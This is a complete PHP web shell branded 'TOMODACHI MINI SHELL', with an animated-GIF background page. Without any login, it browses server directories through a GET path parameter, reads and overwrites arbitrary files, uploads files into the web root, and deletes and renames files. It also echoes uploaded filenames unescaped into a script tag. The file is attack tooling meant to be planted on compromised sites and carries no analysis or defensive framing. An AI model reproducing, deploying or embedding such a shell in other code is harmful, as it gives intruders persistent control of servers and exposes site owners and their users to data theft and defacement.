<!DOCTYPE html>
<html>
    <title>TOMODACHI MINI SHELL</title>
    <body>
        <style>
            body {
                background-image: url(https://i.gifer.com/1Zoc.gif);
                background-size:cover; 
                background-attachment: fixed;
            }
        </style>
    </body>
</html>
<?php
if(isset($_GET['path'])) {
    $path = $_GET['path'];
} else {
    $path = getcwd();
}
echo '<center>
<a href="?"><font face="Monaco" color="aqua">Home</a></font>
<a href="?upload"><font face="Monaco" color="aqua">Upload</a></font>
<a href="?edit"><font face="Monaco" color="aqua">Edit file</a></font>
<a href="?rename"><font face="Monaco" color="aqua">Rename file</a></font>
<a href="?delete"><font face="Monaco" color="aqua">Delete file</a></font>
<br>
';
echo 'Current Path: '.$path.'<br><br>';
foreach (scandir($path) as $items) {
    echo "$items<br>";
}
if(isset($_GET['edit'])) {
    ?>
    <br>
    <form method="get">
        <label>Filename:</label><br>
        <input type="text" name="file" placeholder="/file.php" style="width: 250px;"><br>
        <input type="submit" value="submit">
    </form>
    <?php
}

if (isset($_GET['file'])) {
    ?>
    <br>
    <form method="post">
        <textarea name="content" cols="31" rows="10"><?php echo file_get_contents($_GET['file'])?></textarea><br>
        <input type="submit" name="post" value="Submit" style="display: block; padding: 8px 12px;">
    </form>
    <?php
    if (isset($_POST["post"])) {
        $open = fopen($_GET['file'], 'w');
        fwrite($open, $_POST['content']);
        fclose($open);
        if($open) {
            echo 'Edit file success';
        } else {
            echo 'Edit file failed';
        }
    }
}

if (isset($_GET['upload'])) {
    ?>
    <br><br>
    <form method="POST" enctype="multipart/form-data">
        <label for="naxx" class="button-tools">Choose File Here</label><br>
        <input type="file" name="tomodachi_file" id="tomodachi">
        <input type="submit" name="upkan" value="Upload" class="submit">
        <br>
    </form>
    <?php
    if (isset($_POST["upkan"])) {
        if (move_uploaded_file($_FILES["tomodachi_file"]["tmp_name"], $_FILES["tomodachi_file"]["name"])) {
            $file = basename($_FILES["tomodachi_file"]["name"]);
            echo "<script>alert('$file uploaded')</script>";
        } else {
            echo "<center>Upload fail</center>";
        }
    } else {
        echo "<center>No file selected</center>";
    }
}

if (isset($_GET['delete'])) {
    ?>
    <br><br>
    <form method="post">
        <input type="text" name="delfile" placeholder="eg: index.php or folder/index.php" style="width: 250px;"><br>
        <input type="submit" name="del" value="Delete">
    </form>
    <?php
    if(isset($_POST['del'])) {
        if(unlink($_POST['delfile'])) {
            echo 'Delete file success';
        } else {
            echo 'Delete file failed';
        }
    }
}

if(isset($_GET['rename'])) {
    ?>
    <br><br>
    <form method="post">
        <label>Old Filename:</label>
        <input type="text" name="old" placeholder="eg: index.php or folder/index.php" style="width: 250px;"><br>
        <label>New Filename:</label>
        <input type="text" name="new" placeholder="eg: index.php or folder/index.php" style="width: 250px;"><br>
        <input type="submit" name="rename" value="Rename">
    </form>
    <?php
    if(isset($_POST['rename'])) {
        if(rename($_POST['old'], $_POST['new'])) {
            echo 'Rename file success';
        } else {
            echo 'Rename file failed';
        }
    }
}
?>
<br><br><br>
<h3><font face="Monaco" color="aqua">TOMODACHI SHELL</h3></font>
</center>
